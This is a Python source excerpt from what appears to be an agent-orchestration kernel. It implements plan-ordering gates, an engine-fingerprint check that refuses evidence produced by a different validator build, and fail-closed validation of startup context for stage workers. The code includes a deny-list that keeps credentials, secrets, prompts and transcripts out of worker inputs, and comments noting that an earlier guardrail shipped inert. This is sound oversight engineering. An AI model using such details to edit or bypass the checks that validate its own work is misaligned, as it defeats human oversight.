        if not isinstance(t, dict):
            continue
        tid = t.get("id")
        if not isinstance(tid, str) or not _TASK_SLOT_RE.match(tid):
            errors.append(
                f"plan task id {tid!r} is not a usable contract slot — task "
                "ids become TASKPLANE_TASK and are embedded in the dispatch "
                "brief, so they must match " + _TASK_SLOT_RE.pattern
                + "; rename it in plan/tasks.json before approval")
    return errors


def plan_ordering_refusal(ws: str, tasks, where: str, by=None):
    """B2 (R-0008): one refusal for BOTH plan transitions — the mechanical
    plan GATE (a loop initialized without the 'plan' checkpoint goes
    plan→execute there and would otherwise bypass the rule entirely) and
    plan_approval approve(). Identical refusal either way: both task ids
    named in the error, traced loop_gate_blocked / loop_approve_blocked
    with reason=ordering. Returns None when the plan is ordered.

    Also carries the E5 task-id charset check (`plan_task_id_errors`):
    these two transitions are exactly where an un-slottable id has to be
    caught — before human approval makes the rename expensive — and
    reason=task_id distinguishes it in the trace."""
    ids = plan_task_id_errors(tasks)
    ordering = plan_ordering_errors(tasks)
    problems = ids + ordering
    if not problems:
        return None
    reason = "task_id" if ids else "ordering"
    if where == "gate":
        trace(ws, "loop_gate_blocked", step="plan", reason=reason,
              errors=problems)
        step = "plan"
    else:
        trace(ws, "loop_approve_blocked", gate="plan", reason=reason,
              errors=problems, by=by)
        step = "plan_approval"
    label = "plan gate BLOCKED" if ids else "plan ordering gate BLOCKED"
    return {"error": label + " — " + "; ".join(problems),
            "step": step, "ordering": ordering, "task_ids": ids}


# ------------------------------------------------ engine fingerprint (A4)

# The VALIDATOR SURFACE (R-0007 A4, decision 0018): every module whose BYTES
# can change what the evaluate gate's `_evaluation_errors` walk accepts or
# rejects. Evidence produced under one build of these files and judged by
# another is the recorded t7 topology (a wave worker's worktree engine ahead
# of the primary validator) — there the verdict depends on WHICH process ran
# rather than on the evidence. Why each module is on the list:
#
#   loop            — owns _evaluation_errors itself and the gate ordering
#   taskplane_lite  — this kernel: the fingerprint/staleness/DoD attestations
#                     the walk is built on
#   audit_projection — closed privacy projection used by every trace sink
#   audit           — the router-audit sweep the walk folds into its errors
#   lens            — routes the expected lens set the walk demands verdicts
#                     for (and the catalog behind it)
#   lens_signals    — the detector corpus that routing is derived from
#   design_contract — the design-currency errors the walk prepends
#   depgraph        — graph DoD: impact, product_impact, requirement nodes
#   decompose       — module realization behind the graph DoD's node set
#   requirements    — the acceptance criteria the walk demands evidence for
#   runtime_eval    — deterministic pre-submit drift correction/blocking
#
# A FIXED list, not runtime introspection of sys.modules: the fingerprint has
# to be identical in the producing and validating processes, so it must not
# depend on which modules a given process happened to import first.
VALIDATOR_SURFACE = ("audit", "audit_projection", "decompose", "depgraph",
                     "design_contract", "lens", "lens_signals", "loop",
                     "loop_status", "requirements", "runtime_eval",
                     "taskplane_lite")

ENGINE_SKEW_REMEDY = (
    "merge the task branch into the primary (git merge {branch}) so ONE "
    "engine owns production and validation, then run `loop submit {outcome}` "
    "again — the loop stays at evaluate, so re-evaluation is never stranded")


def _surface_source(name: str) -> bytes | None:
    """The bytes of a validator-surface module AS LOADED by this process
    (``sys.modules[name].__file__``), falling back to this kernel's own
    directory for a surface module the process has not imported. Only the
    BYTES are hashed, never the path: one engine checked out twice (primary
    and worktree) must fingerprint identically — it is the same build."""
    module = sys.modules.get(name)
    path = getattr(module, "__file__", None) if module is not None else None
    if not path:
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            name + ".py")
    try:
        with open(path, "rb") as f:
            return f.read()
    except OSError:
        return None


def engine_fingerprint() -> str:
    """Identity of the ENGINE BUILD producing or validating gate evidence:
    sha256 over the sorted (module, sha256(module file bytes)) material of
    VALIDATOR_SURFACE. A module this process cannot read is recorded as
    'missing' rather than skipped, so a truncated engine is not silently
    equal to a complete one."""
    h = hashlib.sha256()
    for name in sorted(VALIDATOR_SURFACE):
        src = _surface_source(name)
        digest = ("missing" if src is None
                  else hashlib.sha256(src).hexdigest())
        h.update(f"{name}:{digest}\n".encode("utf-8"))
    return h.hexdigest()


def workspace_engine_fingerprint(workspace: str) -> "str | None":
    """A4 REPAIR (EM, v3 phase 3). `engine_fingerprint()` hashes the engine
    THIS PROCESS loaded, so `submit` was attesting the SUBMITTING process —
    not the engine that produced the evidence. On every documented path the
    CLI resolves through one installed plugin root, so producer and
    validator were always the same build and the refusal could never fire:
    the guardrail shipped inert.

    This asks the question A4 actually meant: what engine lives in the
    workspace the evidence came out of? A wave worktree that edited engine
    files carries its OWN validator surface under `<ws>/taskplane/`, and
    that is precisely the Phase 2 skew (t7's evidence produced by the
    worktree's engine, validated by the primary's) A4 was built for.

    Returns None when the workspace carries no engine copy — the ordinary
    case for a repo that merely USES taskplane. None is not a pass: callers
    treat it as 'no independent producer to compare', and the running-engine
    stamp still applies."""
    root = os.path.join(workspace, "taskplane")
    if not os.path.isdir(root):
        return None
    h = hashlib.sha256()
    found = False
    for name in sorted(VALIDATOR_SURFACE):
        path = os.path.join(root, name + ".py")
        try:
            with open(path, "rb") as f:
                digest = hashlib.sha256(f.read()).hexdigest()
            found = True
        except OSError:
            digest = "missing"
        h.update(f"{name}:{digest}\n".encode("utf-8"))
    return h.hexdigest() if found else None


def canonical_json_bytes(value) -> bytes:
    """Stable JSON bytes for small cross-module identity records."""
    return json.dumps(value, sort_keys=True, separators=(",", ":"),
                      ensure_ascii=False, allow_nan=False).encode("utf-8")


# ------------------------------------------------------- stage runtime seam

STAGE_NATIVE_ENV = "TASKPLANE_STAGE_NATIVE"
STAGE_DISPATCH_SCHEMA = "taskplane.stage-dispatch/v1"
STAGE_STARTUP_SCHEMA = "taskplane.stage-startup/v1"
STAGE_RECEIPT_SCHEMA = "taskplane.stage-operation-receipt/v1"
STAGE_AUTHORITY_REFERENCE_SCHEMA = \
    "taskplane.stage-authority-reference/v1"
STAGE_HANDOFF_DISPATCH_SCHEMA = "taskplane.stage-handoff-dispatch/v1"
MAX_STAGE_STARTUP_BYTES = 128 * 1024
MAX_STAGE_RECEIPT_BYTES = 2 * 1024 * 1024
_STAGE_ID_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.:-]{0,127}$")
_STAGE_FINGERPRINT_RE = re.compile(r"^[0-9a-f]{64}$")
_STAGE_RECEIPT_FIELDS = frozenset({
    "schema", "operation_id", "request_fingerprint", "operation",
    "stage_ids", "committed_revision", "result", "result_fingerprint",
})
_STAGE_HANDOFF_FIELDS = frozenset({
    "schema", "producer", "requirement", "design", "target", "commit",
    "contracts", "deliverables", "evidence_references",
    "selected_artifacts", "exclusions", "authorization", "fingerprint",
})
_STAGE_DISPATCH_RECEIPTS = frozenset({
    "start_stage", "terminalize_and_start", "split_stage", "resume_stage",
})
_STAGE_RUNTIME_FORBIDDEN_KEYS = frozenset({
    "activecontract", "agent", "agents", "approval", "approvals", "argv",
    "command", "commands", "conversation", "conversations", "credential",
    "credentials", "cwd", "environment", "env", "event", "events",
    "eventlog", "eventlogs", "hostpath", "lease", "leases", "log", "logs",
    "meter", "meters", "path", "process", "prompt", "prompts",
    "relativepath", "absolutepath", "root", "runtime", "runtimeenvironment",
    "runtimestate", "secret", "secrets", "tool", "tools",
    "tooltranscript", "tooltranscripts", "trace", "traces", "transcript",
    "transcripts", "workspace",
})


class StageDispatchError(ValueError):
    """A stage receipt or bounded startup value is unsafe to dispatch."""


def _stage_modules():
    """Import the optional v4 stage surface only at a native-stage call.

    ``taskplane_lite`` is also the legacy enforcement kernel.  Importing the
    stage modules at module load would make disabled and unmigrated v3 flows
    depend on the new runtime, defeating the rollout boundary.
    """
    try:
        from . import stage_entities, stage_handoff
    except (ImportError, ValueError):  # direct ``taskplane_lite`` import
        import stage_entities
        import stage_handoff
    return stage_entities, stage_handoff


def stage_native_mode(env=None) -> str:
    """Return the fail-closed stage rollout mode.

    Only the two documented explicit values enable mutations.  Missing,
    boolean, numeric, and convenient truthy spellings deliberately remain
    disabled so upgrading the plugin cannot silently migrate an existing
    singleton run.
    """
    source = os.environ if env is None else env
    try:
        raw = source.get(STAGE_NATIVE_ENV)
    except AttributeError:
        return "disabled"
    if not isinstance(raw, str):
        return "disabled"
    value = raw.lower()
    return value if value in {"new-run", "enabled"} else "disabled"


def stage_native_enabled(env=None) -> bool:
    """Whether native stage mutation is explicitly enabled in this process.

    Callers that distinguish new v3 canaries from already-v4 runs use
    :func:`stage_native_mode`; both modes enable the v4 runtime itself.
    """
    return stage_native_mode(env) != "disabled"


def _json_detach(value, label: str):
    try:
        return json.loads(canonical_json_bytes(value).decode("utf-8"))
    except (TypeError, ValueError, UnicodeError) as exc:
        raise StageDispatchError(f"{label} must be canonical JSON") from exc


def _stage_identifier(value, label: str) -> str:
    if not isinstance(value, str) or value.strip() != value or \
            not _STAGE_ID_RE.fullmatch(value):
        raise StageDispatchError(f"{label} is invalid")
    return value


def _stage_fingerprint(value, label: str) -> str:
    if not isinstance(value, str) or not _STAGE_FINGERPRINT_RE.fullmatch(value):
        raise StageDispatchError(f"{label} is invalid")
    return value


def _reject_runtime_context(value, label: str) -> None:
    """Reject predecessor/host runtime channels at the serialization seam."""
    if isinstance(value, dict):
        for key, child in value.items():
            if not isinstance(key, str):
                raise StageDispatchError(f"{label} has a non-string field")
            normalized = re.sub(r"[-_. ]", "", key).lower()
            if normalized in _STAGE_RUNTIME_FORBIDDEN_KEYS:
                raise StageDispatchError(
                    f"{label} contains forbidden runtime field {key!r}")
            _reject_runtime_context(child, label)
    elif isinstance(value, list):
        for child in value:
            _reject_runtime_context(child, label)


def verify_stage_receipt(receipt: dict, *, expected_operation: str | None = None,
                         expected_stage_id: str | None = None) -> dict:
    """Verify and detach one persisted v4 operation receipt.

    The RunStore is authoritative for durability.  This boundary rechecks its
    closed schema and content fingerprint immediately before a lifecycle
    result is allowed to become executable startup context.
    """
    if not isinstance(receipt, dict):
        raise StageDispatchError("stage receipt must be an object")
    required = _STAGE_RECEIPT_FIELDS - {"result", "result_fingerprint"}
    optional = {"result", "result_fingerprint"}
    if not required.issubset(receipt) or set(receipt) - (required | optional):
        raise StageDispatchError("stage receipt fields are invalid")
    if ("result" in receipt) != ("result_fingerprint" in receipt):
        raise StageDispatchError("stage receipt result fields are incomplete")
    if receipt.get("schema") != STAGE_RECEIPT_SCHEMA:
        raise StageDispatchError("stage receipt schema is invalid")
    _stage_identifier(receipt.get("operation_id"), "stage receipt operation id")
    _stage_fingerprint(
        receipt.get("request_fingerprint"), "stage receipt request fingerprint")
    operation = _stage_identifier(
        receipt.get("operation"), "stage receipt operation")
    if expected_operation is not None and operation != expected_operation:
        raise StageDispatchError(
            f"stage receipt operation is {operation}, expected "
            f"{expected_operation}")
    stage_ids = receipt.get("stage_ids")
    if not isinstance(stage_ids, list) or any(
            not isinstance(stage_id, str) for stage_id in stage_ids):
        raise StageDispatchError("stage receipt stage ids are invalid")
    checked_ids = [_stage_identifier(value, "stage receipt stage id")
                   for value in stage_ids]
    if checked_ids != sorted(set(checked_ids)):
        raise StageDispatchError(
            "stage receipt stage ids must be sorted and unique")
    if not checked_ids and operation != "rebuild_active_stage_projection":
        raise StageDispatchError("stage receipt stage ids are empty")
    if expected_stage_id is not None:
        expected = _stage_identifier(expected_stage_id, "expected stage id")
        if expected not in checked_ids:
            raise StageDispatchError(
                "stage receipt does not bind the expected stage")
    revision = receipt.get("committed_revision")
    if isinstance(revision, bool) or not isinstance(revision, int) or \
            revision < 1:
        raise StageDispatchError(
            "stage receipt committed revision is invalid")
    if "result" in receipt:
        try:
            result_bytes = canonical_json_bytes(receipt["result"])
        except (TypeError, ValueError, UnicodeError) as exc:
            raise StageDispatchError(
                "stage receipt result must be canonical JSON") from exc
        if len(result_bytes) > MAX_STAGE_RECEIPT_BYTES:
            raise StageDispatchError("stage receipt result exceeds its bound")
        expected_result = hashlib.sha256(result_bytes).hexdigest()
        if receipt.get("result_fingerprint") != expected_result:
            raise StageDispatchError(
                "stage receipt result fingerprint mismatch")
    checked = _json_detach(receipt, "stage receipt")
    if len(canonical_json_bytes(checked)) > MAX_STAGE_RECEIPT_BYTES:
        raise StageDispatchError("stage receipt exceeds its bound")
    return checked


def _expected_dispatch_head(stage: dict, stage_entities) -> dict:
    payload = canonical_json_bytes(stage) + b"\n"
    stage_id = str(stage["stage_id"])
    fingerprint = str(stage["fingerprint"])
    return {
        "object": {
            "schema": "taskplane.stage-object-ref/v1",
            "stage_id": stage_id,
            "fingerprint": fingerprint,
            "digest": hashlib.sha256(payload).hexdigest(),
            "bytes": len(payload),
            "locator": f"stages/objects/{stage_id}/{fingerprint}.json",
        },
        "summary": stage_entities.bounded_stage_summary(stage),
    }


def _verify_dispatch_result(stage: dict, receipt: dict,
                            stage_entities) -> None:
    """Bind a dispatch to the operation's exact committed active head."""
    result = receipt.get("result")
    if not isinstance(result, dict):
        raise StageDispatchError("stage dispatch receipt has no bounded result")
    operation = receipt["operation"]
    if operation == "resume_stage":
        # Resume has no new head.  _dispatch_claim validates its exact stage,
        # fingerprint, execution root, attempt id, and attempt claim below.
        return
    stage_id = str(stage["stage_id"])
    if operation == "start_stage":
        head = result.get("head")
    elif operation == "terminalize_and_start":
        head = result.get("successor_head")
    else:
        child_heads = result.get("child_heads")
        head = (child_heads.get(stage_id)
                if isinstance(child_heads, dict) else None)
    if head != _expected_dispatch_head(stage, stage_entities):
        raise StageDispatchError(
            "stage dispatch receipt committed head does not match stage")


def _verified_handoff_for_dispatch(stage: dict, handoff: dict,
                                   selected_artifacts: list) -> dict:
    if not isinstance(handoff, dict) or set(handoff) != _STAGE_HANDOFF_FIELDS:
        raise StageDispatchError("verified handoff fields are invalid")
    if handoff.get("schema") != "taskplane.stage-handoff/v1":
        raise StageDispatchError("verified handoff schema is invalid")
    _, stage_handoff = _stage_modules()
    try:
        expected = stage_handoff.manifest_fingerprint(handoff)
    except (TypeError, ValueError) as exc:
        raise StageDispatchError("verified handoff is not canonical JSON") \
            from exc
    if handoff.get("fingerprint") != expected:
        raise StageDispatchError("verified handoff fingerprint mismatch")
    handoff_bytes = canonical_json_bytes(handoff)
    if len(handoff_bytes) > 64 * 1024:
        raise StageDispatchError("verified handoff exceeds its bound")
    producer = handoff.get("producer")
    if not isinstance(producer, dict) or set(producer) != {
            "stage_id", "outcome"} or \
            producer.get("outcome") not in {"done", "closed", "discarded"}:
        raise StageDispatchError("verified handoff producer is invalid")
    _stage_identifier(producer.get("stage_id"), "handoff producer stage id")
    predecessors = stage.get("predecessor_stage_ids") or []
    if predecessors and producer.get("stage_id") not in predecessors:
        raise StageDispatchError(
            "verified handoff producer is not a stage predecessor")
    if handoff.get("requirement") != stage.get("requirement") or \
            handoff.get("design") != stage.get("design"):
        raise StageDispatchError(
            "verified handoff revision does not match stage")
    exclusions = handoff.get("exclusions")
    if not isinstance(exclusions, list) or exclusions != sorted(set(exclusions)) \
            or not stage_handoff.REQUIRED_EXCLUSIONS.issubset(exclusions):
        raise StageDispatchError("verified handoff exclusions are invalid")
    evidence = handoff.get("evidence_references")
    if not isinstance(evidence, list) or not evidence:
        raise StageDispatchError(
            "verified handoff evidence references are incomplete")
    authorization = handoff.get("authorization")
    authority_record = (authorization.get("authority_record")
                        if isinstance(authorization, dict) else None)
    revision = (authority_record.get("revision")
                if isinstance(authority_record, dict) else None)
    authority = stage.get("authority")
    if not isinstance(authorization, dict) or \
            not isinstance(authority_record, dict) or \
            not isinstance(authority, dict) or \
            authority_record.get("schema") != \
            "taskplane.authority-record-reference/v1" or \
            authority_record.get("authority_schema") != \
            "taskplane.consolidated-authorization/v1" or \
            isinstance(revision, bool) or not isinstance(revision, int) or \
            revision < 0 or not _STAGE_FINGERPRINT_RE.fullmatch(
                str(authority_record.get("fingerprint") or "")):
        raise StageDispatchError(
            "verified handoff authority record is invalid")
    if authorization.get("actor") != authority.get("actor") or \
            authorization.get("session_id") != authority.get("session_id") or \
            revision != authority.get("authority_revision") or \
            authority_record.get("fingerprint") != \
            authority.get("authority_fingerprint"):
        raise StageDispatchError(
            "verified handoff authorization does not match stage authority")
    input_reference = stage.get("input_manifest_ref")
    if not isinstance(input_reference, dict) or \
            input_reference.get("fingerprint") != expected or \
            input_reference.get("bytes") != len(handoff_bytes):
        raise StageDispatchError(
            "stage input does not bind the verified handoff")
    if not isinstance(selected_artifacts, list):
        raise StageDispatchError("selected artifacts must be a list")
    detached = _json_detach(selected_artifacts, "selected artifacts")
    if detached != stage.get("selected_artifacts") or \
            detached != handoff.get("selected_artifacts"):
        raise StageDispatchError(
            "selected artifacts do not match stage and handoff")
    _reject_runtime_context(handoff, "verified handoff")
    _reject_runtime_context(detached, "selected artifacts")
    return _json_detach(handoff, "verified handoff")


def _dispatch_claim(stage: dict, receipt: dict,
                    attempt_id: str | None) -> tuple[dict, str | None]:
    run_id = str(stage["run_id"])
    stage_id = str(stage["stage_id"])
    execution_root_id = str(stage["execution_root_id"])
    operation = str(receipt["operation"])
    if operation == "resume_stage":
        result = receipt.get("result")
        if not isinstance(result, dict):
            raise StageDispatchError("resume receipt has no bounded result")
        claim = result.get("claim")
        recorded_attempt = result.get("attempt_id")
        if not isinstance(claim, dict):
            raise StageDispatchError("resume receipt has no attempt claim")
        attempt = _stage_identifier(
            recorded_attempt, "resume receipt attempt id")
        if attempt_id is not None and \
                _stage_identifier(attempt_id, "stage attempt id") != attempt:
            raise StageDispatchError("resume receipt attempt id mismatch")
        if result.get("stage_id") != stage_id or \
                result.get("execution_root_id") != execution_root_id or \
                result.get("stage_fingerprint") != stage.get("fingerprint"):
            raise StageDispatchError("resume receipt does not match stage")
        expected_claim = {
            "schema": "taskplane.stage-execution-attempt-claim/v1",
            "run_id": run_id,
            "stage_id": stage_id,
            "execution_root_id": execution_root_id,
            "attempt_id": attempt,
        }
        if claim != expected_claim:
            raise StageDispatchError("resume receipt attempt claim is invalid")
        return expected_claim, attempt
    if attempt_id is not None:
        raise StageDispatchError(
            "only a verified resume receipt may select an attempt")
    return {
        "schema": "taskplane.stage-execution-root-claim/v1",
        "run_id": run_id,
        "stage_id": stage_id,
        "execution_root_id": execution_root_id,
    }, None


def _declared_stage_scope(value) -> dict | None:
    if value is None:
        return None
    if not isinstance(value, dict) or set(value) != {
            "scope_paths", "out_of_scope_paths"}:
        raise StageDispatchError(
            "declared scope needs scope_paths and out_of_scope_paths")
    checked: dict[str, list[str]] = {}
    for field in ("scope_paths", "out_of_scope_paths"):
        rows = value.get(field)
        if not isinstance(rows, list) or len(rows) > 64 or any(
                not isinstance(row, str) or not row.strip() or
                row.strip() != row or len(row.encode("utf-8")) > 512
                for row in rows):
            raise StageDispatchError(f"declared {field} is invalid")
        if rows != sorted(set(rows)):
            raise StageDispatchError(
                f"declared {field} must be sorted and unique")
        checked[field] = list(rows)
    _reject_runtime_context(checked, "declared scope")
    return checked


def _stage_authority_reference(authority: dict) -> dict:
    """Project attributable local authority to a pseudonymous reference.

    The caller has already validated the stage aggregate and matched its raw
    actor/session attribution to the verified handoff.  Hashing that complete
    binding preserves a deterministic, cross-host proof link without placing
    the identifying values in agent-facing startup bytes.
    """
    checked = _json_detach(authority, "stage authority")
    return {
        "schema": STAGE_AUTHORITY_REFERENCE_SCHEMA,
        "fingerprint": hashlib.sha256(canonical_json_bytes(checked)).hexdigest(),
    }


def _verify_stage_authority_reference(value) -> dict:
    if not isinstance(value, dict) or set(value) != {"schema", "fingerprint"} \
            or value.get("schema") != STAGE_AUTHORITY_REFERENCE_SCHEMA:
        raise StageDispatchError("stage authority reference is invalid")
    _stage_fingerprint(
        value.get("fingerprint"), "stage authority reference fingerprint")
    # The complete startup serialization below is the closed JSON boundary.
    # Avoid serializing this already closed two-field projection a second
    # time during read-side verification.
    return dict(value)


def _dispatch_handoff_projection(handoff: dict,
                                 authority_reference: dict) -> dict:
    """Make a content-addressed handoff projection safe for a stage worker."""
    projected = _json_detach(handoff, "verified handoff")
    source_fingerprint = projected.pop("fingerprint")
    projected["schema"] = STAGE_HANDOFF_DISPATCH_SCHEMA
    projected["source_fingerprint"] = source_fingerprint
    projected["authorization"] = _json_detach(
        authority_reference, "stage authority reference")
    projected["fingerprint"] = hashlib.sha256(
        canonical_json_bytes(projected)).hexdigest()
    return projected


def _verify_dispatch_handoff_projection(value, authority_reference: dict) \
        -> dict:
    fields = _STAGE_HANDOFF_FIELDS | {"source_fingerprint"}
    if not isinstance(value, dict) or set(value) != fields or \
            value.get("schema") != STAGE_HANDOFF_DISPATCH_SCHEMA:
        raise StageDispatchError("stage dispatch handoff projection is invalid")
    _stage_fingerprint(
        value.get("source_fingerprint"), "source handoff fingerprint")
    supplied = _stage_fingerprint(
        value.get("fingerprint"), "stage dispatch handoff fingerprint")
    payload = dict(value)
    payload.pop("fingerprint")
    expected = hashlib.sha256(canonical_json_bytes(payload)).hexdigest()
    if supplied != expected:
        raise StageDispatchError(
            "stage dispatch handoff projection fingerprint mismatch")
    if value.get("authorization") != authority_reference:
        raise StageDispatchError(
            "stage dispatch handoff authority reference mismatch")
    # ``payload`` was just canonicalized to verify its fingerprint and the
    # complete startup is canonicalized once more below.  A third detach
    # serialization adds startup cost without strengthening the boundary.
    return dict(value)


def stage_runtime_dispatch(stage: dict, receipt: dict, handoff: dict,
                           selected_artifacts: list, *,
                           attempt_id: str | None = None,
                           declared_scope: dict | None = None) -> dict:
    """Build the sole bounded context admitted to a native stage worker.

    No workspace path or predecessor execution state is accepted as input.
    The exact startup bytes are obtained with :func:`stage_startup_bytes`.
    """
    stage_entities, _ = _stage_modules()
    try:
        checked_stage = stage_entities.validate_stage(stage)
    except (TypeError, ValueError) as exc:
        raise StageDispatchError(f"stage is invalid: {exc}") from exc
    if checked_stage.get("state") != "active":
        raise StageDispatchError("only an active stage can be dispatched")
    checked_receipt = verify_stage_receipt(
        receipt, expected_stage_id=str(checked_stage["stage_id"]))
    if checked_receipt["operation"] not in _STAGE_DISPATCH_RECEIPTS:
        raise StageDispatchError(
            "receipt operation does not create or resume stage execution")
    _verify_dispatch_result(
        checked_stage, checked_receipt, stage_entities)
    checked_handoff = _verified_handoff_for_dispatch(
        checked_stage, handoff, selected_artifacts)
    claim, attempt = _dispatch_claim(
        checked_stage, checked_receipt, attempt_id)
    scope = _declared_stage_scope(declared_scope)
    authority_reference = _stage_authority_reference(
        checked_stage["authority"])
    dispatch_handoff = _dispatch_handoff_projection(
        checked_handoff, authority_reference)
    startup = {
        "schema": STAGE_STARTUP_SCHEMA,
        "stage_id": checked_stage["stage_id"],
        "authority": authority_reference,
        "input_manifest_bytes":
            checked_stage["input_manifest_ref"]["bytes"],
        "input_handoff": dispatch_handoff,
        "selected_artifacts": _json_detach(
            selected_artifacts, "selected artifacts"),
        "budget": checked_stage["budget"],
        "execution_claim": claim,
        "attempt_id": attempt,
    }
    if scope is not None:
        startup["declared_scope"] = scope
    _reject_runtime_context(startup, "stage startup")
    startup = _json_detach(startup, "stage startup")
    serialized = canonical_json_bytes(startup)
    if len(serialized) > MAX_STAGE_STARTUP_BYTES:
        raise StageDispatchError(
            f"stage startup exceeds {MAX_STAGE_STARTUP_BYTES} bytes")
    selected_bytes = sum(int(reference.get("bytes") or 0)
                         for reference in startup["selected_artifacts"])
    telemetry = {
        # Preserve the size of the verified repository-resident input
        # manifest.  The agent-facing handoff is a privacy projection and is
        # intentionally a different byte sequence.
        "manifest_bytes": checked_stage["input_manifest_ref"]["bytes"],
        "startup_bytes": len(serialized),
        # This is a deterministic budgeting estimate, not provider usage.
        "startup_tokens": (len(serialized) + 3) // 4,
        "selected_ref_count": len(startup["selected_artifacts"]),
        "selected_ref_bytes": selected_bytes,
        "predecessor_root_opens": 0,
    }
    return {
        "schema": STAGE_DISPATCH_SCHEMA,
        "startup": startup,
        "startup_sha256": hashlib.sha256(serialized).hexdigest(),
        "telemetry": telemetry,
    }


def stage_dispatch_payload(stage: dict, verified_handoff: dict,
                           selected_artifacts: list, claim: dict, *,
                           attempt_id: str | None = None,
                           declared_scope: dict | None = None) -> dict:
    """Preflight bounded startup against one proposed path-free claim.

    This compatibility seam exists only so the loop can prove serialization
    before it commits a lifecycle mutation.  The post-commit dispatch path
    uses :func:`stage_runtime_dispatch` with the durable RunStore receipt.
    """
    if not isinstance(claim, dict):
        raise StageDispatchError("stage execution claim must be an object")
    operation = "resume_stage" if attempt_id is not None else "start_stage"
    stage_entities, _ = _stage_modules()
    checked_stage = stage_entities.validate_stage(stage)
    result = {"head": _expected_dispatch_head(
        checked_stage, stage_entities)}
    if operation == "resume_stage":
        result = {
            "stage_id": stage.get("stage_id"),
            "attempt_id": attempt_id,
            "execution_root_id": stage.get("execution_root_id"),
            "claim": claim,
            "stage_fingerprint": stage.get("fingerprint"),
        }
    receipt = {
        "schema": STAGE_RECEIPT_SCHEMA,
        "operation_id": "bounded-startup-preflight",
        "request_fingerprint": hashlib.sha256(canonical_json_bytes({
            "stage": stage.get("fingerprint"), "claim": claim,
        })).hexdigest(),
        "operation": operation,
        "stage_ids": [stage.get("stage_id")],
        "committed_revision": 1,
    }
    receipt["result"] = result
    receipt["result_fingerprint"] = hashlib.sha256(
        canonical_json_bytes(result)).hexdigest()
    dispatch = stage_runtime_dispatch(
        stage, receipt, verified_handoff, selected_artifacts,
        attempt_id=attempt_id, declared_scope=declared_scope)
    if claim != dispatch["startup"]["execution_claim"]:
        raise StageDispatchError("stage execution claim is invalid")
    return dispatch


def stage_startup_bytes(dispatch: dict) -> bytes:
    """Return and re-verify the byte-identical bounded startup serialization."""
    if not isinstance(dispatch, dict) or set(dispatch) != {
            "schema", "startup", "startup_sha256", "telemetry"} or \
            dispatch.get("schema") != STAGE_DISPATCH_SCHEMA:
        raise StageDispatchError("stage dispatch envelope is invalid")
    startup = dispatch.get("startup")
    if not isinstance(startup, dict) or \
            startup.get("schema") != STAGE_STARTUP_SCHEMA:
        raise StageDispatchError("stage startup payload is invalid")
    required = {
        "schema", "stage_id", "authority", "input_manifest_bytes",
        "input_handoff",
        "selected_artifacts", "budget", "execution_claim", "attempt_id",
    }
    fields = frozenset(startup)
    if fields not in {frozenset(required),
                      frozenset(required | {"declared_scope"})}:
        raise StageDispatchError("stage startup fields are invalid")
    authority_reference = _verify_stage_authority_reference(
        startup.get("authority"))
    projected_handoff = _verify_dispatch_handoff_projection(
        startup.get("input_handoff"), authority_reference)
    _reject_runtime_context(startup, "stage startup")
    serialized = canonical_json_bytes(startup)
    if len(serialized) > MAX_STAGE_STARTUP_BYTES:
        raise StageDispatchError("stage startup exceeds its bound")
    if dispatch.get("startup_sha256") != \
            hashlib.sha256(serialized).hexdigest():
        raise StageDispatchError("stage startup fingerprint mismatch")
    selected = startup.get("selected_artifacts")
    if not isinstance(selected, list):
        raise StageDispatchError("stage startup selected artifacts are invalid")
    if projected_handoff.get("selected_artifacts") != selected:
        raise StageDispatchError(
            "stage startup handoff selected artifacts mismatch")
    expected_telemetry = {
        "manifest_bytes": startup.get("input_manifest_bytes"),
        "startup_bytes": len(serialized),
        "startup_tokens": (len(serialized) + 3) // 4,
        "selected_ref_count": len(selected),
        "selected_ref_bytes": sum(int(row.get("bytes") or 0)
                                  for row in selected
                                  if isinstance(row, dict)),
        "predecessor_root_opens": 0,
    }
    input_manifest_bytes = startup.get("input_manifest_bytes")
    if isinstance(input_manifest_bytes, bool) or not isinstance(
            input_manifest_bytes, int) or input_manifest_bytes < 0:
        raise StageDispatchError("stage startup telemetry mismatch")
    if dispatch.get("telemetry") != expected_telemetry:
        raise StageDispatchError("stage startup telemetry mismatch")
    return serialized


def review_execution_root_identity(workspace: str) -> dict:
    """Return repository and exact-worktree identity without storing paths.

    A hosted repository id intentionally unifies clones, while the worktree
    fingerprint keeps their evidence distinct. A caller that reaches the
    checkout through a symlink is rejected instead of being silently treated
    as the canonical execution root.
    """
    supplied = os.path.abspath(os.path.expanduser(str(workspace or "")))
    if not supplied or os.path.islink(supplied):
        raise StateError(
            "review_execution_root", "review execution root is symlinked")
    root = _resolved_worktree(supplied)
    if os.path.realpath(root) != root:
        raise StateError(
            "review_execution_root", "review worktree root is not canonical")
    import storage as runtime_storage
    repository = runtime_storage.resolve_repository_identity(root)
    return {
        "schema": "taskplane.review-execution-root/v1",
        "repository_id": repository.repo_id,
        "repository_kind": repository.kind,
        "worktree_fingerprint": hashlib.sha256(
            root.encode("utf-8")).hexdigest(),
        "engine_fingerprint": workspace_engine_fingerprint(root)
                              or engine_fingerprint(),
    }


def engine_skew_refusal(ws: str, submission, step: str = "evaluate",
                        outcome: str = "pass"):
    """A4 (R-0007, decision 0018): refuse a gate whose evidence was produced
    by a DIFFERENT engine build than the one about to validate it. Returns
    None when the two engines agree (every non-dogfood repo, and every
    dogfood task that does not touch engine files) — the caller's flow is
    then byte-unchanged.

    ABSENT stamp = REFUSE, fail-closed: a submission that names no engine
    cannot be shown to have been produced by this one. The in-flight case
    (evidence recorded by a pre-A4 engine) is handled, not ignored — the
    named remedy is `loop submit` again, and submit's idempotence key
    includes engine_fingerprint, so the re-submission REPLACES the unstamped
    record instead of being deduplicated against it.

    A missing submission RECORD is deliberately not this guard's business:
    the submission_required gate above it already refuses that, and legacy
    loops predating that flag must stay resumable. This guard governs the
    engine identity of a record that exists.

    Never executes the producing engine: the comparison is over file bytes,
    so the gate keeps validating with code the worker cannot author (L12).
    """
    if not submission:
        return None
    submitted = submission.get("engine_fingerprint")
    validator = engine_fingerprint()
    reason = "engine_skew"

    # A4 REPAIR (EM, v3 phase 3). The running-engine comparison above is
    # inert on every documented path — one installed plugin root serves
    # producer and validator alike, so `submitted == validator` always. The
    # comparison that BITES is between the engine in the workspace the
    # evidence came out of and the engine in the workspace validating it:
    # a wave worktree that edited engine files carries its own validator
    # surface, which is exactly the Phase 2 skew A4 was built for.
    produced_ws = submission.get("evidence_engine_fingerprint")
    validator_ws = workspace_engine_fingerprint(ws)
